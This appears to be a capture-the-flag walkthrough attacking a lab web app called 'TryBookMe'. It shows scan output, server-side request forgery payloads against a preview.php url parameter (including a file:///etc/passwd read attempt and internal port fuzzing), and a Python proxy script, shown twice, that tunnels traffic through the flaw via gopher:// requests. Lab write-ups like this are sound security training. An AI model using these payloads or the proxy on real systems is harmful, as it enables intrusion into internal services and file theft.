
<h3>Nikto</h3>

```bash
:~/Extract# nikto -h xx.xxx.xxx.xxx
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          xx.xxx.xxx.xxx
+ Target Hostname:    ip-xx-xxx-xxx-xxx.ec2.internal
+ Target Port:        80
+ Start Time:         2025-08-22 xx:xx:xx (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.58 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ 6544 items checked: 0 error(s) and 2 item(s) reported on remote host
+ End Time:           2025-08-22 xx:xx:xx (GMT1) (10 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

<h3>Nmap</h3>

```bash
:~/Extract# rustscan -a 10.201.114.233 --ulimit 5500 -- -A -Pn
...
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.58 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: TryBookMe - Online Library
```

<h3>Dirsearch</h3>

```bash
:~/Extract# dirsearch -u http://xx.xxx.xxx.xxx
...
[xx:xx:xx] 301 -  321B  - /javascript  ->  http://xx.xxx.xxx.xxx/javascript/
[xx:xx:xx] 301 -  321B  - /management  ->  http://xx.xxx.xxx.xxx/management/
...
[xx:xx:xx] 301 -  314B  - /pdf  ->  http://xx.xxx.xxx.xxx/pdf/
```

<br>

```bash
:~/Extract# dirsearch -u http://xx.xxx.xxx.xxx/management/

...
[xx:xx:xx] 302 -    0B  - /management/logout.php  ->  index.php
```

<br>

```bash
:~/Extract# dirsearch -u http://xx.xxx.xxx.xxx/pdf/

...
```

<br>

```bash
:~/Extract# dirsearch -u http://xx.xxx.xxx.xxx/javascript/

...
[xx:xx:xx] 301 -  328B  - /javascript/events  ->  http://xx.xxx.xxx.xxx/javascript/events/
```

<br>

```bash
:~/Extract# dirsearch -u http://xx.xxx.xxx.xxx/javascript/events/

...
[xx:xx:xx] 200 -    4KB - /javascript/events/events
```

<h3>Web port 80</h3>

<img width="1154" height="325" alt="image" src="https://github.com/user-attachments/assets/73f121d0-f3f9-4743-9b53-355fdf94b8d9" />

<br>
<br>

<h6>Request</h6>

```bash
GET / HTTP/1.1
Host: 10.10.177.5
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

<h6>Response</h6>

```bash
HTTP/1.1 200 OK
Date: Fri, 29 Aug 2025 15:52:12 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1735
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>TryBookMe - Online Library</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- Bootstrap CSS -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">

  <style>
    body {
      background-color: #f8f9fa;
    }
    .pdf-list a {
      cursor: pointer;
    }
    iframe {
      border: 1px solid #dee2e6;
      border-radius: 4px;
    }
  </style>
</head>
<body>

  <!-- Navbar -->
  <nav class="navbar navbar-expand-lg navbar-dark bg-dark mb-4">
    <div class="container-fluid">
      <a class="navbar-brand" href="#">? Online Library</a>
    </div>
  </nav>

  <div class="container">
    <div class="row">
      <!-- PDF List -->
      <div class="col-md-4">
        <h4 class="mb-3">Available Documents</h4>
        <ul class="list-group pdf-list">
          <li class='list-group-item'><a onclick="openPdf('http://cvssm1/pdf/dummy.pdf')">Dummy</a></li><li class='list-group-item'><a onclick="openPdf('http://cvssm1/pdf/lorem.pdf')">Lorem</a></li>        </ul>
      </div>

      <!-- Preview Panel -->
      <div class="col-md-8">
        <h4 class="mb-3">Document Preview</h4>
        <iframe id="pdfFrame" width="100%" height="600px" style="display:none;"></iframe>
      </div>
    </div>
  </div>

  <footer class="text-center mt-5 mb-3 text-muted">
    &copy; 2025 TryBookMe · All rights reserved
  </footer>

  <!-- JS -->
  <script>
    function openPdf(url) {
      const iframe = document.getElementById('pdfFrame');
      iframe.src = 'preview.php?url=' + encodeURIComponent(url);
      iframe.style.display = 'block';
    }
  </script>

</body>
</html>
```


<p>

- onclick="openPdf('http://cvssm1/pdf/lorem.pdf')<br>
- onclick="openPdf('http://cvssm1/pdf/dummy.pdf')<br>
- preview.php?url=' + encodeURIComponent(url);</p>



<h6>Resquest</h6>

```bash
GET /preview.php?url=http:/10.201.71.208:8000/test.txt HTTP/1.1
Host: 10.10.177.5
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i


```

<h6>Response</h6

 ```bash
HTTP/1.1 200 OK
Date: Fri, 29 Aug 2025 15:59:25 GMT
Server: Apache/2.4.58 (Ubuntu)
Content-Length: 5
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/plain;charset=UTF-8

test
```


-----

<h6>Resquest</h6>

```bash
GET /preview.php?url=file:///etc/passwd HTTP/1.1
Host: 10.10.177.5
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://10.10.177.5
Upgrade-Insecure-Requests: 1
Priority: u=0, i


```

<h6>Response</h6

 ```bash
HTTP/1.1 200 OK
Date: Fri, 29 Aug 2025 16:01:25 GMT
Server: Apache/2.4.58 (Ubuntu)
Content-Length: 34
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

URL blocked due to keyword: file:/
```


----

<h6>Resquest</h6>

```bash
GET /preview.php?url=http://127.0.0.1:10000/ HTTP/1.1
Host: 10.10.177.5
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://10.10.177.5
Upgrade-Insecure-Requests: 1
Priority: u=0, i


```

<h6>Response</h6

 ```bash
HTTP/1.1 200 OK
Date: Fri, 29 Aug 2025 16:03:17 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 6131
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=utf-8

<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/178989e77b112f7f.css" crossorigin="" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-8fc0c21e0210cbd2.js" crossorigin=""/><script src="/_next/static/chunks/fd9d1056-ffbd49fae2ee76ea.js" async="" crossorigin=""></script><script src="/_next/static/chunks/472-22e55b21ed910619.js" async="" crossorigin=""></script><script src="/_next/static/chunks/main-app-321a014647b5278e.js" async="" crossorigin=""></script><title>TryBookMe API</title><meta name="description" content="API Service for TryBookMe"/><script src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js" crossorigin="" noModule=""></script></head><body><main style="max-width:1000px;margin:0 auto;padding:20px"><header style="margin-bottom:20px"><h1 style="font-size:24px;font-weight:bold">TryBookMe</h1><nav style="margin-top:10px"><ul style="display:flex;gap:16px"><li><a href="/" style="color:blue;text-decoration:underline">Home</a></li><li><a href="/customapi" style="color:blue;text-decoration:underline">API</a></li></ul></nav></header><div style="padding:2rem;max-width:1200px;margin:0 auto"><div style="background:#fff8f8;border:1px solid #ffcdd2;padding:1.5rem;border-radius:8px;margin-top:2rem"><h2 style="font-size:1.8rem;margin-bottom:1rem;color:#d32f2f">Warning</h2><p style="font-size:1.1rem;line-height:1.6">Unauthorised access to this system is strictly prohibited.</p></div></div></main><script src="/_next/static/chunks/webpack-8fc0c21e0210cbd2.js" crossorigin="" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0]);self.__next_f.push([2,null])</script><script>self.__next_f.push([1,"1:HL[\"/_next/static/css/178989e77b112f7f.css\",\"style\",{\"crossOrigin\":\"\"}]\n0:\"$L2\"\n"])</script><script>self.__next_f.push([1,"3:I[3728,[],\"\"]\n5:I[9928,[],\"\"]\n6:I[6954,[],\"\"]\n7:I[7264,[],\"\"]\n"])</script><script>self.__next_f.push([1,"2:[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/178989e77b112f7f.css\",\"precedence\":\"next\",\"crossOrigin\":\"\"}]],[\"$\",\"$L3\",null,{\"buildId\":\"k9Pjo5x24QkUE90SdyHNw\",\"assetPrefix\":\"\",\"initialCanonicalUrl\":\"/\",\"initialTree\":[\"\",{\"children\":[\"__PAGE__\",{}]},\"$undefined\",\"$undefined\",true],\"initialHead\":[false,\"$L4\"],\"globalErrorComponent\":\"$5\",\"children\":[null,[\"$\",\"html\",null,{\"lang\":\"en\",\"children\":[\"$\",\"body\",null,{\"children\":[\"$\",\"main\",null,{\"style\":{\"maxWidth\":\"1000px\",\"margin\":\"0 auto\",\"padding\":\"20px\"},\"children\":[[\"$\",\"header\",null,{\"style\":{\"marginBottom\":\"20px\"},\"children\":[[\"$\",\"h1\",null,{\"style\":{\"fontSize\":\"24px\",\"fontWeight\":\"bold\"},\"children\":\"TryBookMe\"}],[\"$\",\"nav\",null,{\"style\":{\"marginTop\":\"10px\"},\"children\":[\"$\",\"ul\",null,{\"style\":{\"display\":\"flex\",\"gap\":\"16px\"},\"children\":[[\"$\",\"li\",null,{\"children\":[\"$\",\"a\",null,{\"href\":\"/\",\"style\":{\"color\":\"blue\",\"textDecoration\":\"underline\"},\"children\":\"Home\"}]}],[\"$\",\"li\",null,{\"children\":[\"$\",\"a\",null,{\"href\":\"/customapi\",\"style\":{\"color\":\"blue\",\"textDecoration\":\"underline\"},\"children\":\"API\"}]}]]}]}]]}],[\"$\",\"$L6\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\"],\"loading\":\"$undefined\",\"loadingStyles\":\"$undefined\",\"loadingScripts\":\"$undefined\",\"hasLoading\":false,\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L7\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[\"$\",\"title\",null,{\"children\":\"404: This page could not be found.\"}],[\"$\",\"div\",null,{\"style\":{\"fontFamily\":\"system-ui,\\\"Segoe UI\\\",Roboto,Helvetica,Arial,sans-serif,\\\"Apple Color Emoji\\\",\\\"Segoe UI Emoji\\\"\",\"height\":\"100vh\",\"textAlign\":\"center\",\"display\":\"flex\",\"flexDirection\":\"column\",\"alignItems\":\"center\",\"justifyContent\":\"center\"},\"children\":[\"$\",\"div\",null,{\"children\":[[\"$\",\"style\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}\"}}],[\"$\",\"h1\",null,{\"className\":\"next-error-h1\",\"style\":{\"display\":\"inline-block\",\"margin\":\"0 20px 0 0\",\"padding\":\"0 23px 0 0\",\"fontSize\":24,\"fontWeight\":500,\"verticalAlign\":\"top\",\"lineHeight\":\"49px\"},\"children\":\"404\"}],[\"$\",\"div\",null,{\"style\":{\"display\":\"inline-block\"},\"children\":[\"$\",\"h2\",null,{\"style\":{\"fontSize\":14,\"fontWeight\":400,\"lineHeight\":\"49px\",\"margin\":0},\"children\":\"This page could not be found.\"}]}]]}]}]],\"notFoundStyles\":[],\"childProp\":{\"current\":[\"$L8\",[\"$\",\"div\",null,{\"style\":{\"padding\":\"2rem\",\"maxWidth\":\"1200px\",\"margin\":\"0 auto\"},\"children\":[\"$\",\"div\",null,{\"style\":{\"background\":\"#fff8f8\",\"border\":\"1px solid #ffcdd2\",\"padding\":\"1.5rem\",\"borderRadius\":\"8px\",\"marginTop\":\"2rem\"},\"children\":[[\"$\",\"h2\",null,{\"style\":{\"fontSize\":\"1.8rem\",\"marginBottom\":\"1rem\",\"color\":\"#d32f2f\"},\"children\":\"Warning\"}],[\"$\",\"p\",null,{\"style\":{\"fontSize\":\"1.1rem\",\"lineHeight\":1.6},\"children\":\"Unauthorised access to this system is strictly prohibited.\"}]]}]}],null],\"segment\":\"__PAGE__\"},\"styles\":null}]]}]}]}],null]}]]\n"])</script><script>self.__next_f.push([1,"4:[[\"$\",\"meta\",\"0\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}],[\"$\",\"meta\",\"1\",{\"charSet\":\"utf-8\"}],[\"$\",\"title\",\"2\",{\"children\":\"TryBookMe API\"}],[\"$\",\"meta\",\"3\",{\"name\":\"description\",\"content\":\"API Service for TryBookMe\"}]]\n8:null\n"])</script><script>self.__next_f.push([1,""])</script></body></html>
```


----

<h2>proxy.py</h2>

#!/usr/bin/env python3

import socket
import requests
import urllib.parse
import threading

LHOST = '127.0.0.1'
LPORT = 5000
TARGET_HOST = "10.10.82.71"
HOST_TO_PROXY = "127.0.0.1"
PORT_TO_PROXY = 10000

def handle_client(conn, addr):
    with conn:
        data = conn.recv(65536)
        double_encoded_data = urllib.parse.quote(urllib.parse.quote(data))
        target_url = f"http://{TARGET_HOST}/preview.php?url=gopher://{HOST_TO_PROXY}:{PORT_TO_PROXY}/_{double_encoded_data}"
        resp = requests.get(target_url)
        conn.sendall(resp.content)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((LHOST, LPORT))
    s.listen()
    print(f"Listening on {LHOST}:{LPORT}, proxying to {HOST_TO_PROXY}:{PORT_TO_PROXY} via {TARGET_HOST}...")
    while True:
        conn, addr = s.accept()
        client_thread = threading.Thread(target=handle_client, args=(conn, addr), daemon=True)
        client_thread.start()




:~/Extract# python3 proxy.py
Listening on 127.0.0.1:5000, proxying to 127.0.0.1:10000 via 10.10.177.5...




http://127.0.0.1:5000


<img width="1118" height="385" alt="image" src="https://github.com/user-attachments/assets/2e8f4029-58a5-42e9-93ab-13d13ea18b88" />





```bash
http://xx.xxx.xxx.xxx/preview.php?url=http%3A%2F%2Fcvssm1%2Fpdf%2Florem.pdf
```


http://10.10.192.34/preview.php?url=http://127.0.0.1:10000/

```bash
:~/Extract# ffuf -u 'http://10.10.192.34/preview.php?url=http://127.0.0.1:FUZZ/' -w <(seq 1 65535) -mc all -t 100 -fs 0
...
80                      [Status: 200, Size: 1735, Words: 304, Lines: 65]
10000                   [Status: 200, Size: 6131, Words: 104, Lines: 1]
```

<img width="1183" height="402" alt="image" src="https://github.com/user-attachments/assets/eebdd6e0-248a-42a3-8cbf-853f40f70640" />

<br>
<br>

<img width="1126" height="382" alt="image" src="https://github.com/user-attachments/assets/40c4f9be-a4b4-4ec9-8121-530f506cff98" />

<br>

<img width="1187" height="409" alt="image" src="https://github.com/user-attachments/assets/7691c521-93af-4027-ba74-ee379044aba9" />

<br>

#!/usr/bin/env python3

import socket
import requests
import urllib.parse
import threading

LHOST = '127.0.0.1'
LPORT = 5000
TARGET_HOST = "10.10.82.71"
HOST_TO_PROXY = "127.0.0.1"
PORT_TO_PROXY = 10000

def handle_client(conn, addr):
    with conn:
        data = conn.recv(65536)
        double_encoded_data = urllib.parse.quote(urllib.parse.quote(data))
        target_url = f"http://{TARGET_HOST}/preview.php?url=gopher://{HOST_TO_PROXY}:{PORT_TO_PROXY}/_{double_encoded_data}"
        resp = requests.get(target_url)
        conn.sendall(resp.content)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((LHOST, LPORT))
    s.listen()
    print(f"Listening on {LHOST}:{LPORT}, proxying to {HOST_TO_PROXY}:{PORT_TO_PROXY} via {TARGET_HOST}...")
    while True:
        conn, addr = s.accept()
        client_thread = threading.Thread(target=handle_client, args=(conn, addr), daemon=True)
        client_thread.start()


<h3>Searchsploit</h3>

```bash
:~/Extract# searchsploit Online Library
----------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                           |  Path
----------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Online Library Management System 1.0 - 'Search' SQL Injection                                                                            | php/webapps/50053.txt
Online Library Management System 1.0 - Arbitrary File Upload                                                                             | php/webapps/48928.txt
Online Library Management System 1.0 - Arbitrary File Upload Remote Code Execution (Unauthenticated)                                     | php/webapps/50054.py
----------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
